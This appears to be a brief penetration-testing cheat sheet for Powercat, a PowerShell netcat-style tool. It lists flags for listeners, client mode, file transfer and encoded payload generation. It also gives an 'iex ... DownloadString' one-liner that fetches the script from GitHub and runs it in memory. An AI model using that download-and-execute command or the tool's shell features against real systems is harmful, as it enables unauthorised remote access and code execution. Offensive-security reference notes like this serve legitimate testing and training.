# Powercat

```text
powercat -h

-l option to create a listener
-c option specifies client mode and sets the listening IP address
-p specifies the port number to connect to
-i indicates the local file that will be transferred remotely
-g option to redirect the output to a file
-e to generate a stand-alone encoded payload
```

```text
PS C:> . .\powercat.ps1

PS C:> iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

```





